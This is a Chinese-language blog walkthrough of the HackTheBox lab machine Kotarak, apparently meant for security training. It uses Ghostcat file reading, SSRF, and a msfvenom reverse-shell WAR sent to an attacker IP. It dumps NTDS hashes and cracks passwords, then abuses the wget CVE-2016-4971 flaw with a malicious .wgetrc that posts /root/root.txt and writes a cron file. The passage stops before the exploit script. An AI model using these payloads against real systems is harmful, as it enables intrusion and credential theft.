@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="p0melo">
+    
+    <title>
+        
+            HTB之Kotarak |
+        
+        p0melo&#39;blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/p0melo.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/p0melo.svg","favicon":"/images/p0melo.svg","article_img_align":"left","left_side_width":"300px","content_max_width":"950px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/8ad759f62321493ee2e3565c60a3632a.jpeg","description":"心之所向，素履以往，生如逆旅，一苇以航。"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":false},"code_copy":{"enable":false,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                p0melo&#39;blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">HTB之Kotarak</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/p0melo.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">p0melo</span>
+                        
+                            <span class="author-label">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2022-06-18 18:12:38
+    </span>
+    
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Kotarak这题难度为Hard，涉及的技术点还是挺多的，打下来还是收获不少，值得玩一玩儿</p>
+<h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><p>扫描开放端口</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="literal">-p</span>- -<span class="literal">-min</span><span class="literal">-rate</span> <span class="number">10000</span> <span class="number">10.10</span>.<span class="number">10.55</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_z2Y48beZfD.png" class="">
+
+<p>针对开放端口使用脚本扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 22,8009,8080,60000 -sC 10.10.10.55</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_gwKNhD_F9_.png" class="">
+
+<p>可以看到开放了8009端口（ajp协议），可以想到Tomcat的幽灵猫漏洞（文件读取+文件包含）</p>
+<h1 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h1><p>访问8080的tomcat管理页面，尝试了几个弱密码登录，登录失败</p>
+<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_wcmrPPCo_k.png" class="">
+
+<h1 id="8009"><a href="#8009" class="headerlink" title="8009"></a>8009</h1><p>前面端口扫描出了8009端口，searchsploit搜索下8009的<code>Ghostcat</code>漏洞</p>
+<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_izfKM0NW9C.png" class="">
+
+<p>查看exp使用方法</p>
+<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_BE5h5SUunF.png" class="">
+
+<p>尝试读取<code>WEB-INF/web.xml</code>文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 /usr/share/exploitdb/exploits/multiple/webapps/48143.py -p 8009 -f WEB-INF/web.xml 10.10.10.55</span><br></pre></td></tr></table></figure>
+
+<p>读取成功</p>
+<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_NUu5gd75yW.png" class="">
+
+<p>但只能读取<code>webapps</code>目录下文件，进一步利用需要知道目录下的文件，或使用文件包含结合文件上传，这里先放一放</p>
+<h1 id="60000"><a href="#60000" class="headerlink" title="60000"></a>60000</h1><p>访问60000端口，提示一个web隐私浏览器</p>
+<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_H_aLerZDFN.png" class="">
+
+<p>尝试在输入框中随便填写<code>123</code>提交，可以看到url中将输入拼接到了<code>url.php?path=</code>后</p>
+<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_ZFNiqkEIxZ.png" class="">
+
+<p>根据url的路径可以猜想到SSRF，尝试将path修改为<code>127.0.0.1:60000</code>，发现确实可以SSRF</p>
+<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_IYYtysWBRn.png" class="">
+
+<p>尝试使用file协议访问<code>/etc/passwd</code>提示<code>try harder</code>，说明访问可能有限制</p>
+<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_JRndUXiTtP.png" class="">
+
+<p>参考网上脚本，遍历1-1000以内的本地开放的端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(seq 0 1000); <span class="keyword">do</span> <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$i</span>: &quot;</span>;curl -s http://10.10.10.55:60000/url.php?path=localhost:<span class="variable">$i</span> ; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<p>查看扫描出的的开放端口，有320、888两个有web页面的端口</p>
+<p>320端口是一个登录页面，没有账号密码没法登录</p>
+<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_haxSEwvXq4.png" class="">
+
+<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_DyDUsbzP3u.png" class="">
+
+<p>888端口是一个静态资源页面</p>
+<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_Z3nxuOkUuL.png" class="">
+
+<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_fsosO_7pF9.png" class="">
+
+<p>可以看到每个文件的链接都是<code>http://10.10.10.55:60000/url.php?doc=</code>开头，直接点击访问是跳转<code>10.10.10.55</code></p>
+<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_afg-5LRhVh.png" class="">
+
+<p>不是ssrf访问会看不到文件内容，所以尝试用前面的ssrf访问backup，发现<code>admin</code>/<code>3@g01PdhB!</code>账号密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.55:60000/url.php?path=127.0.0.1:888?doc=backup</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_xomTOA0NAW.png" class="">
+
+<p>尝试使用该账号密码登录8080端口的tomcat管理页面</p>
+<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_iRHh7VmwH8.png" class="">
+
+<h1 id="上传恶意war包"><a href="#上传恶意war包" class="headerlink" title="上传恶意war包"></a>上传恶意war包</h1><p>使用<code>msfvenom</code>生产恶意war包并上传</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.15 LPORT=443 -f war -o rev.war</span><br><span class="line">Payload size: 13314 bytes</span><br><span class="line">Final size of war file: 13314 bytes</span><br><span class="line">Saved as: rev.war</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_PBM3QwE_j6.png" class="">
+
+<p>访问url即可在443端口接收到shell</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.55:8080/rev</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_vigyUMtnvz.png" class="">
+
+<p>通过<a class="link"   target="_blank" rel="noopener" href="https://github.com/Fahrj/reverse-ssh"  title="reverse-ssh工具">reverse-ssh工具<i class="fas fa-external-link-alt"></i></a>升级交互式shell</p>
+<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_kZsiEJsV8A.png" class="">
+
+<h1 id="提权至atanas用户"><a href="#提权至atanas用户" class="headerlink" title="提权至atanas用户"></a>提权至atanas用户</h1><p>查看flag文件<code>/home/atanas/user.txt</code>提示无权限，所以这里要先提权到atanas用户，查看当前用户目录<code>/home/tomcat</code>下所有文件，发现windows注册表文件和<code>ntds.dit</code>文件</p>
+<p><code>ntds.dit </code>文件是一个存储 Active Directory 数据的数据库，通常在在域控中，包括有关用户对象、组和组成员的信息，并且该文件还存储域中所有用户的密码哈希，</p>
+<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_4PaPBZ1yK1.png" class="">
+
+<h2 id="dumphash"><a href="#dumphash" class="headerlink" title="dumphash"></a>dumphash</h2><p>将上面的<code>.dit</code>和<code>.bin</code>拉到kali本地，kali集成<code>impacket</code>工具箱里的<code>impacket-secretsdump</code>命令可以就可以提取用户的密码hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">$ impacket-secretsdump -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -system 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin LOCAL</span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x14b6fb98fedc8e15107867c4722d1399</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching <span class="keyword">for</span> pekList, be patient</span><br><span class="line">[*] PEK <span class="comment"># 0 found and decrypted: d77ec2af971436bccb3b6fc4a969d7ff</span></span><br><span class="line">[*] Reading and decrypting hashes from 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::</span><br><span class="line">WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487:::</span><br><span class="line">WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279:::</span><br><span class="line">WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772:::</span><br><span class="line">WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c:::</span><br><span class="line">atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::</span><br><span class="line">[*] Kerberos keys from 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit </span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:6c53b16d11a496d0535959885ea7c79c04945889028704e2a4d1ca171e4374e2</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:e2a25474aa9eb0e1525d0f50233c0274</span><br><span class="line">Administrator:des-cbc-md5:75375eda54757c2f</span><br><span class="line">WIN-3G2B0H151AC$:aes256-cts-hmac-sha1-96:84e3d886fe1a81ed415d36f438c036715fd8c9e67edbd866519a2358f9897233</span><br><span class="line">WIN-3G2B0H151AC$:aes128-cts-hmac-sha1-96:e1a487ca8937b21268e8b3c41c0e4a74</span><br><span class="line">WIN-3G2B0H151AC$:des-cbc-md5:b39dc12a920457d5</span><br><span class="line">WIN-3G2B0H151AC$:rc4_hmac:668d49ebfdb70aeee8bcaeac9e3e66fd</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:14134e1da577c7162acb1e01ea750a9da9b9b717f78d7ca6a5c95febe09b35b8</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:8b96c9c8ea354109b951bfa3f3aa4593</span><br><span class="line">krbtgt:des-cbc-md5:10ef08047a862046</span><br><span class="line">krbtgt:rc4_hmac:ca1ccefcb525db49828fbb9d68298eee</span><br><span class="line">WIN2K8$:aes256-cts-hmac-sha1-96:289dd4c7e01818f179a977fd1e35c0d34b22456b1c8f844f34d11b63168637c5</span><br><span class="line">WIN2K8$:aes128-cts-hmac-sha1-96:deb0ee067658c075ea7eaef27a605908</span><br><span class="line">WIN2K8$:des-cbc-md5:d352a8d3a7a7380b</span><br><span class="line">WIN2K8$:rc4_hmac:160f6c1db2ce0994c19c46a349611487</span><br><span class="line">WINXP1$:aes256-cts-hmac-sha1-96:347a128a1f9a71de4c52b09d94ad374ac173bd644c20d5e76f31b85e43376d14</span><br><span class="line">WINXP1$:aes128-cts-hmac-sha1-96:0e4c937f9f35576756a6001b0af04ded</span><br><span class="line">WINXP1$:des-cbc-md5:984a40d5f4a815f2</span><br><span class="line">WINXP1$:rc4_hmac:6f5e87fd20d1d8753896f6c9cb316279</span><br><span class="line">WIN2K31$:aes256-cts-hmac-sha1-96:f486b86bda928707e327faf7c752cba5bd1fcb42c3483c404be0424f6a5c9f16</span><br><span class="line">WIN2K31$:aes128-cts-hmac-sha1-96:1aae3545508cfda2725c8f9832a1a734</span><br><span class="line">WIN2K31$:des-cbc-md5:4cbf2ad3c4f75b01</span><br><span class="line">WIN2K31$:rc4_hmac:cdd7a7f43d06b3a91705900a592f3772</span><br><span class="line">WIN7$:aes256-cts-hmac-sha1-96:b9921a50152944b5849c706b584f108f9b93127f259b179afc207d2b46de6f42</span><br><span class="line">WIN7$:aes128-cts-hmac-sha1-96:40207f6ef31d6f50065d2f2ddb61a9e7</span><br><span class="line">WIN7$:des-cbc-md5:89a1673723ad9180</span><br><span class="line">WIN7$:rc4_hmac:24473180acbcc5f7d2731abe05cfa88c</span><br><span class="line">atanas:aes256-cts-hmac-sha1-96:933a05beca1abd1a1a47d70b23122c55de2fedfc855d94d543152239dd840ce2</span><br><span class="line">atanas:aes128-cts-hmac-sha1-96:d1db0c62335c9ae2508ee1d23d6efca4</span><br><span class="line">atanas:des-cbc-md5:6b80e391f113542a</span><br><span class="line">[*] Cleaning up...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>接着将<code>:::</code>符号前面的最后一段hash取出，通过<code>hashcat</code>或一些在线hash破解的网站，如</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://crackstation.net/"  title="https://crackstation.net/">https://crackstation.net/<i class="fas fa-external-link-alt"></i></a>和<a class="link"   target="_blank" rel="noopener" href="https://hashes.com/en/decrypt/hash"  title="https://hashes.com/en/decrypt/hash">https://hashes.com/en/decrypt/hash<i class="fas fa-external-link-alt"></i></a></p>
+<p>查出<code>atanas</code>用户的明文密码为<code>Password123!</code>，<code>Administrator</code>密码为<code>f16tomcat!</code></p>
+<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_tmnztcASxP.png" class="">
+
+<p>尝试用这两个密码ssh登录<code>atanas</code>用户失败，应该是这账号被禁止ssh登录了，尝试用<code>tomcat</code>用户su到<code>atanas</code>，密码为<code>f16tomcat!</code>，登录成功</p>
+<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_Bx-FFN9-lb.png" class="">
+
+<h1 id="提权至root"><a href="#提权至root" class="headerlink" title="提权至root"></a>提权至root</h1><h2 id="10-0-3-133"><a href="#10-0-3-133" class="headerlink" title="10.0.3.133"></a>10.0.3.133</h2><p><code>atanas</code>用户可以直接查看<code>/root/</code>目录下文件，查看<code>flag.txt</code>文件并无<code>flag</code>，通过<code>access.log</code>文件可以发现有台机器使用了低版本的<code>wget</code>请求<code>/archive.tar.gz</code>路径，并且每次请求间隔是2分钟</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">atanas@kotarak-dmz:/root$ cat app.log </span><br><span class="line">10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] <span class="string">&quot;GET /archive.tar.gz HTTP/1.1&quot;</span> 404 503 <span class="string">&quot;-&quot;</span> <span class="string">&quot;Wget/1.16 (linux-gnu)&quot;</span></span><br><span class="line">10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] <span class="string">&quot;GET /archive.tar.gz HTTP/1.1&quot;</span> 404 503 <span class="string">&quot;-&quot;</span> <span class="string">&quot;Wget/1.16 (linux-gnu)&quot;</span></span><br><span class="line">10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] <span class="string">&quot;GET /archive.tar.gz HTTP/1.1&quot;</span> 404 503 <span class="string">&quot;-&quot;</span> <span class="string">&quot;Wget/1.16 (linux-gnu)&quot;</span></span><br><span class="line">atanas@kotarak-dmz:/root$ cat flag.txt</span><br><span class="line">Getting closer! But what you are looking <span class="keyword">for</span> can<span class="string">&#x27;t be found here.</span></span><br><span class="line"><span class="string">atanas@kotarak-dmz:/root$ </span></span><br></pre></td></tr></table></figure>
+
+<p>使用<code>find</code>命令查看本地并没有<code>archive.tar.gz</code>，使用<code>ping</code>日志中的<code>10.0.3.133</code>来源IP，发现可以ping通，可以想到是要拿下<code>10.0.3.133</code>机器的权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">atanas@kotarak-dmz:/root$ find / -name archive.tar.gz 2&gt;/dev/null</span><br><span class="line">atanas@kotarak-dmz:/root$                                        </span><br><span class="line">atanas@kotarak-dmz:/root$ ping 10.0.3.133                        </span><br><span class="line">PING 10.0.3.133 (10.0.3.133) 56(84) bytes of data.</span><br><span class="line">64 bytes from 10.0.3.133: icmp_seq=1 ttl=64 time=0.066 ms</span><br><span class="line">64 bytes from 10.0.3.133: icmp_seq=2 ttl=64 time=0.095 ms</span><br><span class="line">^C</span><br><span class="line">--- 10.0.3.133 ping statistics ---</span><br><span class="line">2 packets transmitted, 2 received, 0% packet loss, time 999ms</span><br><span class="line">rtt min/avg/max/mdev = 0.066/0.080/0.095/0.017 ms</span><br><span class="line">atanas@kotarak-dmz:/root$ </span><br></pre></td></tr></table></figure>
+
+<h2 id="wget漏洞"><a href="#wget漏洞" class="headerlink" title="wget漏洞"></a>wget漏洞</h2><p>使用<code>searchsploit</code>查下<code>wget</code>的漏洞，在<code>wget</code>版本低于<code>1.18</code>可以rce，而目标版本使用的是<code>1.16</code>，符合条件</p>
+<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_uYRoWq3huZ.png" class="">
+
+<p>下面介绍下该漏洞（CVE-2016-4971），更多漏洞详情和poc可参考<a class="link"   target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/40064"  title="https://www.exploit-db.com/exploits/40064">https://www.exploit-db.com/exploits/40064<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="CVE-2016-4971"><a href="#CVE-2016-4971" class="headerlink" title="CVE-2016-4971"></a>CVE-2016-4971</h2><p><code>wget</code>默认情况下是将请求url中的文件名作为下载到本地的文件名，例如<code>wget</code>请求<code>http://website.com/folder/file.txt</code>，文件会保存在当前目录下，文件名为<code>file.txt</code></p>
+<p>在<code>wget</code>版本低于<code>1.18</code>时，若<code>wget</code>的<code>http</code>目标存在<code>30x</code>跳转到一个<code>ftp</code>地址，本地保存的文件名将会是<code>ftp</code>上的文件名，而忽略掉<code>http</code>目标的文件名。</p>
+<p>例如用户请求<code>wget http://attackers-server/safe_file.txt</code>，攻击者可以构造一个302返回，将请求跳转到包含恶意文件的ftp服务器上</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>private</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>ftp://attackers-server/.bash_profile</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>262</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache</span><br></pre></td></tr></table></figure>
+
+<p>用户最后下载的文件将是<code>.bash_profile</code>，而<code>safe_file.txt</code>将会被忽略。</p>
+<p>上面的利用只能下载到当前文件夹下，其实我们可以通过覆盖<code>wget</code>的配置文件来控制写入路径。</p>
+<p><code>wget</code>配置文件可以控制<code>wget</code>写入目录、post文件、http代理等，详细配置信息见<a class="link"   target="_blank" rel="noopener" href="https://www.gnu.org/software/wget/manual/wget.html#Wgetrc-Commands"  title="官网">官网<i class="fas fa-external-link-alt"></i></a>。<code>wget</code>配置文件默认会先从<code>/usr/local/etc/wgetrc</code>路径或环境变量<code>WGETRC</code>设置的路径读取，若都没有，则会从<code>$HOME/.wgetrc</code>读取配置。当<code>wget</code>是被定时任务执行时，文件的下载目录默认是执行用户的home目录，我们就可以在home目录下写入<code>.wgetrc</code>文件来配置<code>wget</code>的写入路径，可以通过写入定时任务、<code>~/.bashrc</code>(有的发行版为<code>~/.bash_profile</code>)来反弹shell，或在web目录写入<code>webshell</code>等操作。</p>
+<p>所以我们接下来将靶机<code>10.10.10.55</code>（内网ip为<code>10.0.3.1</code>）作为攻击机，而<code>10.0.3.133</code>作为用户机，利用wget漏洞来获取<code>10.0.3.133</code>的权限。</p>
+<p>由于需要运行exp的同时使用nc监听反弹的shell，就需要用到两个终端，可以反弹2个不同端口sehll或使用<code>tmux</code>分屏（单一会话，推荐使用），下面是tmux设置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># TERM的值可在kali终端运行echo $TERM获取</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm-256color </span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置终端大小，可在kali终端运行stty -a查看</span></span><br><span class="line">stty rows 48</span><br><span class="line">stty columns 236</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行tmux，ctrl+b激活终端，tmux使用说明可参考https://www.ruanyifeng.com/blog/2019/10/tmux.html</span></span><br><span class="line">tmux</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>分屏效果如下</p>
+<img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_WadiibIlCy.png" class="">
+
+<p>通过首先在<code>10.0.3.1</code>上启动一个ftp服务器，将恶意的<code>.wgetrc</code>配置文件方在ftp服务器下，由于是非root用户启动小于<code>1024</code>的端口号，所以需要用到<code>authbind</code>命令。然后监听接收shell的9999端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">atanas@kotarak-dmz:/tmp$ cat &lt;&lt;<span class="string">_EOF_&gt;.wgetrc</span></span><br><span class="line"><span class="string">post_file = /root/root.txt</span></span><br><span class="line"><span class="string">output_document = /etc/cron.d/wget-root-shell</span></span><br><span class="line"><span class="string">_EOF_</span></span><br><span class="line">atanas@kotarak-dmz:/tmp$ authbind python -m pyftpdlib -p21 -w                                                         </span><br><span class="line">/usr/<span class="built_in">local</span>/lib/python2.7/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to ano</span><br><span class="line">nymous user.                                                                                                          </span><br><span class="line">  RuntimeWarning)                                                           </span><br><span class="line">[I 2022-06-18 05:52:51] &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=29992 &lt;&lt;&lt;</span><br><span class="line">[I 2022-06-18 05:52:51] concurrency model: async</span><br><span class="line">[I 2022-06-18 05:52:51] masquerade (NAT) address: None</span><br><span class="line">[I 2022-06-18 05:52:51] passive ports: None</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">atanas@kotarak-dmz:/tmp$ nc -lvp 9999</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 9999)   </span><br><span class="line">                                               </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>上面<code>.wgetrc</code>配置文件的<code>post_file</code>配置表示，所有<code>wget</code>的请求都使用<code>post</code>方法发送，并将设置的文件作为<code>post</code>请求体发送，等同于<code>--post-file=</code>命令的作用。<code>output_document</code>配置表示输出的文件路径和名称，等同于<code>-O</code>参数。</p>
+<p>接着编辑下面的exp.py并在靶机启动，作用就是启动一个http服务器（<code>10.0.3.1</code>），用于接收来自同网段的<code>10.0.3.133</code>的定时<code>wget</code>请求，并将请求转发到恶意的ftp服务器（kali <code>10.10.14.5</code>）下载</p>
